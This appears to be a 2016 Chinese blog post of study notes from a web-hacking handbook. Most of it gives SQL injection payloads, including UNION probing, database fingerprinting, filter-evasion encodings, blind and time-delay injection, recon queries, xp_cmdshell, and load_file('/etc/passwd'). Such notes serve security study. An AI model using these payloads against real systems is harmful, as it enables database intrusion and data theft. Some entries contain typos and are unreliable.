title: 黑客攻防技术宝典web实战篇笔记4
date: 2016-01-08 12:57:39
categories: [web]
tags: [web]
---

攻击会话管理
<!--more-->
会话令牌生成过程中的薄弱环节； 在整个生命周期过程中处理会话令牌的薄弱环节。
#### 状态要求  p172

#### 令牌可预测
隐含序列； 时间依赖； 生成的数字随机性不强

p238
1.尝试输入一个结果等于原始数字值的简单学表达式。例如，如果原始值为2，尝试提交1+1或3-1.如果应用程序做出相同的响应，则表示它易于受到攻击。
2.如果证实被修改的数据会对应用程序的行为造成明显影响，则前面描述的测试方法最为可靠。例如，如果应用程序使用数字化PageID参数指定应返回什么内容，则用1+1代替2得到相同的结果名校表示存在SQL注入。但是，如果能够在数字化参数中插入任意输入，但应用程序的行为却没有发生改变，那么前面的检测方法就无法发现漏洞。
3.如果在第一个测试方法取得成功，你可以利用更复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证明。ASCII值为65，在SQL中，以下表达式等于2. 67-ASCII('A')
4.如果单引号被过滤掉，那么前面的测试方法就没有作用。但是，这时可以利用这样一个事实：即在必要时，数据库会隐含的将数字数据转化为字符串数据。例如，因为字符1的ASCII值为49，在SQL	中，以下表达式等于2.  51-ASCII（1）

#### 注入查询结构
1.记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数
2.提供一系列在参数值中提交数字值的请求，从数字1开始，然后逐个请求递增。
 如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到ORDER BY 子句中。在sql中，ORDER BY 1将依据第一个列进行排序。然后，将这个数字增加到2将更改数据的显示顺序，以依据第二个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，你可以通过使用一下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他sql：
1 ASC --
1 DESC --
 如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中，例如：
select 1,title,year from books where publisher='Wiley'

#### 指纹识别数据库
oracle : 'serv'||'ices'
MS-sql : 'serv'+'ices'
Mysql :  'serv'空格'ices'
如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据库在目标数据库中的求值结果为0，在其他数据库则会导致错误。
orcale ：BITAND(1,1)-BITAND(1,1)
ms-sql： @@PACK_RECEIVED-@@PACK_RECEIVED
Mysql: CONNECTION_ID()-CONNECTION_ID()

UNION
'UNION SELECT NULL--
'UNION SELECT NULL,NULL--
'UNION SELECT NULL,NULL,NULL--
确定列后
'UNION SELECT 'a',NULL,NULL--
'UNION SELECT NULL,'a',NULL--
'UNION SELECT NULL,NULL,'a'--


Oracle: SELECT table_name||':'||column_name FROM all_tab_columns
MS-SQL: SELECT table_name+':'+column_name from information_schema.columns
MySQL : SELECT CONCAT(table_name,':',column_name) from information_schema.columns

9.2.8 避开过滤 
1.列名单引号，通过字符串函数使用每个字符ASCII
select ename,sa1 from emp where ename='mar'
select ename,sa1 from emp where ename=CHR(109)||CHR(97)||CHR(114)
select ename,sa1 from emp where ename=CHR(109)+CHR(97)+CHR(114)

注释字符被阻止
' or 1=1--
' or 'a'='a
在MSSQL数据库注入批量查询，不必使用分好分隔符。只要纠正所有批量查询的语法，无论你是否使用分好，查询解析器都会正确解释他们。
2.避免使用简单确认
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4C%45%43%54
%2553%2545%254C%2545%2543%2554
3.使用SQL注释
SQL语句注释内容包含再/*与*/符号之间。如果应用程序阻止或删除输入中的空格，可以使用注释“冒充”
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SELECT/*foo*/username,password/*foo*/FR/*foo*/OM users
4.利用有缺陷的过滤
输入确认机制通常包含逻辑缺陷，可以对这些缺陷加以利用，使用被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序再多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面缺陷。

9.2.9 二阶SQL输入 247


高级利用 P 249
SELECT * FROM users WHERE username = 'marcus' and password = 'secret'


input: foo' || (SELECT 1 FROM dual WHERE  (SELECT username FROM all_users WHERE username = 'DBSNMP')='DBSNMP')--

SELECT * FROM users WHERE username = 'foo' || (SELECT 1 FROM dual WHERE  (SELECT username FROM all_users WHERE username = 'DBSNMP')='DBSNMP')

admin' AND ASCII(SUBSTRING('Admin',1,1))=65--
P254

9.2.13 
Oracle ASCII('A') 65 SUBSTR('ABCDE',2,3)  BCD
MS-SQL ASCII('A') 65 SUBSTRING('ABCDE',2,3) BCD
MYSQL  ASCII('A') 65 SUBSTRING('ABCDE',2,3) BCD
获取当前数据库用户
Oracle select Sys.login_user from dual select user FROM dual SYS_CONTEXT('USERENV','SESSION_USER')
MSSQL select suser_sname()
MYSQL SELECT user()
引起时间延迟
oracle Utl_Http.request('http://madeupserver.com')
mssql  waitfor delay '0:0:10" exec master ..xp_cmdshell 'ping localhost'
mysql  sleep(10)
获取数据库版本
o select banner from v$version
s select @@version
y select @@version
获取当前数据库
o select SYS_CONTEXT('USERENV','DB_NAME') FROM dual
s select db_name()   select @@servername
y select database()
获取当前用户权限
o select privilege from session_privs
s select grantee,table_name,privilege_type from INFORMATION_SCHEMA,TABLE_PRIVILEGES
y select * from information_schema.user_privileges where grantee = '[user]'
在单独的结果列显示所有表和列
o select table_name||' '||column_name from all_tab_columns
s select table_name+' ',column_name from information_schema.columns
y select CONCAT(table_name+' ',column_name) from information_schema.columns
显示用户对象
o select object_name, object_name,object_type from user_objects
s select name from sysobjects
y select table_name from information_schema.tables  (或trigger_name from information_schema.trigers)
显示用户表
o select object_name,object_type from user_objects wherer object_type='TABLE'
  SELECT table_name from all_tables
s select name from sysobjects where extype='U'
y select table_name from information_schema.tables where table_type='BASE TABLE' and table_schema!='mysql'
显示表foo的列名称
o select column_name, name from user_tab_columns where table_name='foo'
s select column_name from information_schema.columns where table_name='foo'
y select column_name from information_schema.columns where table_name='foo'
与操作系统交互
s exec xp_cmshell 'dir c:\'
y select load_file('/etc/passwd')


P268
